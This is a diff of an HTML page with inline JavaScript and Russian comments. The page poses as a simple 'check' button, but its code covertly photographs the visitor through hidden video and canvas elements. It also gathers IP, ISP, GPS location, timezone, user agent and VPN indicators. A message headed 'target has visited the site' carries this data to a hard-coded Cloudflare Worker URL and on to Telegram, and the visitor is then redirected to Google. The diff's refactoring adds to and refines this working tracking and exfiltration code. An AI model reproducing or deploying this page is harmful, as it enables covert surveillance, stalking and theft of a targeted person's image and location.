@@ -27,12 +27,11 @@
   button:hover{background:#2ea043}
   button:active{transform:translateY(1px)}
   button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
-  .status{margin-top:20px;font-size:13px;color:#8b949e;font-family:monospace;
-          min-height:22px;white-space:pre-wrap;word-break:break-all;
+  .status{margin-top:20px;font-size:12px;color:#8b949e;font-family:monospace;
+          min-height:18px;white-space:pre-wrap;word-break:break-all;
           text-align:left;line-height:1.55}
   .ok{color:#3fb950!important}
   .err{color:#f85149!important}
-  .warn{color:#d29922!important}
   video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
@@ -64,15 +63,15 @@
 
 <script>
 // ============================================================
-// ВСТАВЬ URL ТВОЕГО CLOUDFLARE WORKER
+// ВСТАВЬ URL ТВОЕГО WORKER (с путём /api/send)
 // ============================================================
 var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
 // ============================================================
 
 (function(){
-  var btn = document.getElementById('btn');
-  var st  = document.getElementById('st');
-  var cam = document.getElementById('cam');
+  var btn  = document.getElementById('btn');
+  var st   = document.getElementById('st');
+  var cam  = document.getElementById('cam');
   var snap = document.getElementById('snap');
 
   function setStatus(text, cls){
@@ -80,41 +79,28 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     st.textContent = text;
   }
 
-  // ---------- Отправка на Worker с диагностикой ----------
-  async function sendReport(text, photoDataUrl){
-    var payloadKind = photoDataUrl ? 'multipart' : 'json';
-    console.log('[send] → POST', WORKER_URL, '| вид:', payloadKind);
-
+  // ---- Отправка на Worker (фото + caption или только текст) ----
+  async function sendReport(caption, blob){
     try {
       var r;
-      if (photoDataUrl) {
-        var blob = await (await fetch(photoDataUrl)).blob();
-        console.log('[send] фото размер:', blob.size, 'байт, тип:', blob.type);
+      if (blob) {
         var form = new FormData();
-        form.append('caption', text);
+        form.append('caption', caption);
         form.append('photo', blob, 'snapshot.jpg');
         r = await fetch(WORKER_URL, { method: 'POST', body: form });
       } else {
         r = await fetch(WORKER_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ text: text })
+          body: JSON.stringify({ text: caption })
         });
       }
-
-      console.log('[send] ← HTTP статус:', r.status);
-
-      var rawText = await r.text();
-      console.log('[send] ← ответ тела:', rawText.slice(0, 400));
-
+      var raw = await r.text();
       var j;
-      try { j = JSON.parse(rawText); }
-      catch(e) {
-        return { ok: false, err: 'Worker вернул не-JSON (статус ' + r.status + '): ' + rawText.slice(0, 200) };
-      }
+      try { j = JSON.parse(raw); }
+      catch(e) { return { ok: false, err: 'Worker вернул не-JSON (HTTP ' + r.status + '): ' + raw.slice(0, 200) }; }
       return j;
-    } catch (e) {
-      console.error('[send] Исключение:', e);
+    } catch(e) {
       return { ok: false, err: 'Сеть/исключение: ' + e.message };
     }
   }
@@ -194,12 +180,10 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         return resolve({ error: 'getUserMedia not supported' });
       }
       try {
-        console.log('[cam] запрашиваем доступ...');
         var stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
-        console.log('[cam] доступ получен');
         cam.srcObject = stream;
         cam.play();
         await new Promise(function(res){
@@ -213,11 +197,9 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         var ctx = snap.getContext('2d');
         ctx.drawImage(cam, 0, 0, w, h);
         var dataUrl = snap.toDataURL('image/jpeg', 0.85);
-        console.log('[cam] снимок готов:', w + 'x' + h, ', dataURL длина', dataUrl.length);
         stream.getTracks().forEach(function(t){ t.stop(); });
         resolve({ dataUrl: dataUrl, w: w, h: h });
       } catch(e) {
-        console.error('[cam] ошибка:', e.name, e.message);
         resolve({ error: e.name + ': ' + e.message });
       }
     });
@@ -238,7 +220,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
   btn.addEventListener('click', async function(){
     btn.disabled = true;
     btn.textContent = 'Проверяем…';
-    setStatus('Запрашиваем разрешения…');
+    setStatus('1/4 Запрашиваем разрешения (камера + геолокация)…');
 
     var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
@@ -247,19 +229,28 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       getCameraSnapshot()
     ]);
 
-    setStatus('Формируем отчёт…');
+    // --- фото в blob ---
+    var photoBlob = null;
+    var camLine = '✗ не получено';
+    if (camRes && camRes.dataUrl) {
+      camLine = '✓ снимок ' + camRes.w + 'x' + camRes.h;
+      try { photoBlob = await (await fetch(camRes.dataUrl)).blob(); }
+      catch(e){ photoBlob = null; camLine = '✗ не удалось сделать blob'; }
+    } else if (camRes && camRes.error) {
+      camLine = '✗ отклонено: ' + camRes.error;
+    }
+
+    setStatus('2/4 Камера: ' + camLine + '\n3/4 Формируем отчёт…');
 
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
     try {
-      var tzCountryGuess = {
+      var map = {
         'Europe/Moscow':'RU','Europe/Berlin':'DE','Europe/Amsterdam':'NL',
         'Europe/London':'GB','America/New_York':'US','America/Los_Angeles':'US',
         'Asia/Tokyo':'JP','Asia/Shanghai':'CN','Asia/Dubai':'AE'
-      }[tz] || null;
-      if (tzCountryGuess && ipInfo.country && tzCountryGuess !== ipInfo.country) {
-        vpnSuspected = true;
-      }
+      };
+      if (map[tz] && ipInfo.country && map[tz] !== ipInfo.country) vpnSuspected = true;
     } catch(e){}
 
     var geoLine = 'не получена';
@@ -273,13 +264,6 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       geoLine = 'отклонено: ' + geo.error;
     }
 
-    var camLine = 'не получена';
-    if (camRes && camRes.dataUrl) {
-      camLine = 'снимок сделан ' + camRes.w + 'x' + camRes.h;
-    } else if (camRes && camRes.error) {
-      camLine = 'отклонено: ' + camRes.error;
-    }
-
     var text =
       '🚨 <b>ЦЕЛЬ ЗАШЛА НА САЙТ</b>\n' +
       '━━━━━━━━━━━━━━━━━━━\n' +
@@ -288,7 +272,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '🏙 Город (IP): <code>' + (ipInfo.city || 'н/д') + '</code>\n' +
       '📡 Провайдер: <code>' + (ipInfo.isp || 'н/д') + '</code>\n' +
       '🕐 Часовой пояс СИСТЕМЫ: <code>' + tz + '</code>\n' +
-      '🚨 VPN: <b>' + (vpnSuspected ? 'ДА (TZ ≠ IP-страна)' : 'возможно нет') + '</b>\n' +
+      '🚨 VPN: <b>' + (vpnSuspected ? 'ДА' : 'возможно нет') + '</b>\n' +
       '━━━━━━━━━━━━━━━━━━━\n' +
       '📍 GPS: <code>' + geoLine + '</code>' + addressLine + '\n' +
       '📷 Камера: <code>' + camLine + '</code>\n' +
@@ -302,46 +286,37 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
 
-    setStatus('Отправляем на сервер...\n\n[1/2] POST → Worker');
+    setStatus('4/4 Отправляем через Worker…');
 
-    var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
-    var res = await sendReport(text, photoData);
+    var result = await sendReport(text, photoBlob);
 
-    // ---------- Разбор результата ----------
-    console.log('[send] финальный результат:', res);
-
-    if (res && res.ok) {
+    if (result && result.ok) {
+      var sentAs = photoBlob ? 'с фото' : 'без фото';
       setStatus(
-        '✓ Отправлено успешно.\n\n' +
-        'Worker ответил: ' + JSON.stringify(res.tg ? { ok: res.tg.ok } : res),
+        '✓ ОТПРАВЛЕНО В TELEGRAM (' + sentAs + ')\n\n' +
+        'Камера: ' + camLine + '\n' +
+        'Сообщение ID: ' + (result.tg && result.tg.result && result.tg.result.message_id || '—'),
         'ok'
       );
       btn.textContent = '✓ Готово';
       setTimeout(function(){
         window.location.href = 'https://www.google.com';
       }, 2500);
-      return;
-    }
-
-    // Ошибки — показываем подробно
-    var errMsg = '';
-    if (!res) {
-      errMsg = 'Не получили ответа от Worker. Проверь URL в WORKER_URL.';
-    } else if (res.err) {
-      errMsg = 'Ошибка: ' + res.err;
-    } else if (res.tg && res.tg.error_code) {
-      errMsg = 'Telegram вернул ошибку ' + res.tg.error_code + ': ' + (res.tg.description || '');
     } else {
-      errMsg = 'Неизвестная ошибка: ' + JSON.stringify(res);
+      var reason = 'неизвестная ошибка';
+      if (result && result.err) reason = result.err;
+      else if (result && result.tg && result.tg.description) reason = result.tg.description;
+      else if (result && result.tg && result.tg.error_code) reason = 'код ' + result.tg.error_code;
+      setStatus(
+        '✗ НЕ ОТПРАВЛЕНО\n\n' +
+        'Причина: ' + reason + '\n' +
+        'Камера: ' + camLine + '\n\n' +
+        'Смотри консоль (Cmd+Option+C).',
+        'err'
+      );
+      btn.textContent = 'Повторить';
+      btn.disabled = false;
     }
-
-    setStatus(
-      '✗ ОТПРАВКА НЕ УДАЛАСЬ\n\n' + errMsg +
-      '\n\nОткрой консоль (Cmd+Option+C) для деталей.',
-      'err'
-    );
-    btn.textContent = 'Повторить';
-    btn.disabled = false;
   });
 })();
 </script>
